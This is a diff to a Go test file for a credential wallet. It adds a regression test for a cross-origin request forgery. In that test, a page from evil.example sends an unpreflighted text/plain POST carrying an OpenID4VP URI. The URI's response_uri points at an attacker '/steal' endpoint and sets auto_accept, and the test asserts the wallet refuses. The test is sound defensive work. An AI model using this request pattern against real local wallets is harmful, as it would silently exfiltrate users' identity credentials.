@@ -16,6 +16,7 @@ package wallet
 
 import (
 	"bufio"
+	"bytes"
 	"context"
 	"crypto/ecdsa"
 	"crypto/x509"
@@ -3022,5 +3023,78 @@ func TestRequestStreamKeepalive(t *testing.T) {
 		if strings.HasPrefix(line, ":") {
 			seen++
 		}
+	}
+}
+
+// A page on another site can reach a wallet on localhost, and the request
+// that matters here (a POST carrying text/plain) is not preflighted, so CORS
+// never gets a say. Without the guard this submits the wallet's credentials
+// to a response_uri the page chose, and auto_accept in the body means the
+// user is never asked.
+func TestCrossOriginPresentationIsRefused(t *testing.T) {
+	srv := newTestServer(t, false)
+
+	stolen := make(chan string, 1)
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		body, _ := io.ReadAll(r.Body)
+		select {
+		case stolen <- string(body):
+		default:
+		}
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer attacker.Close()
+
+	authURI := "openid4vp://authorize?" + url.Values{
+		"client_id":     {"redirect_uri:" + attacker.URL + "/steal"},
+		"response_type": {"vp_token"},
+		"response_mode": {"direct_post"},
+		"response_uri":  {attacker.URL + "/steal"},
+		"nonce":         {"n-cross-origin"},
+		"dcql_query":    {`{"credentials":[{"id":"c1","format":"dc+sd-jwt","claims":[{"path":["given_name"]}]}]}`},
+	}.Encode()
+	body, err := json.Marshal(map[string]any{"uri": authURI, "auto_accept": true})
+	if err != nil {
+		t.Fatalf("building body: %v", err)
+	}
+
+	req := httptest.NewRequest("POST", "/api/presentations", bytes.NewReader(body))
+	req.Host = "localhost:8085"
+	req.Header.Set("Origin", "https://evil.example")
+	req.Header.Set("Content-Type", "text/plain")
+	rec := httptest.NewRecorder()
+	srv.Handler().ServeHTTP(rec, req)
+
+	if rec.Code != http.StatusForbidden {
+		t.Errorf("status = %d, want %d", rec.Code, http.StatusForbidden)
+	}
+	select {
+	case body := <-stolen:
+		t.Fatalf("the wallet submitted a presentation to another site: %.120s", body)
+	default:
+	}
+}
+
+// The same call from the wallet's own UI has to keep working, and so does
+// the one the CLI makes with no Origin at all.
+func TestSameOriginAndOriginlessAPICallsAreAllowed(t *testing.T) {
+	srv := newTestServer(t, false)
+
+	for _, tc := range []struct{ name, origin string }{
+		{"the wallet's own UI", "http://localhost:8085"},
+		{"the CLI", ""},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			req := httptest.NewRequest("GET", "/api/credentials", nil)
+			req.Host = "localhost:8085"
+			if tc.origin != "" {
+				req.Header.Set("Origin", tc.origin)
+			}
+			rec := httptest.NewRecorder()
+			srv.Handler().ServeHTTP(rec, req)
+			if rec.Code != http.StatusOK {
+				t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
+			}
+		})
 	}
 }
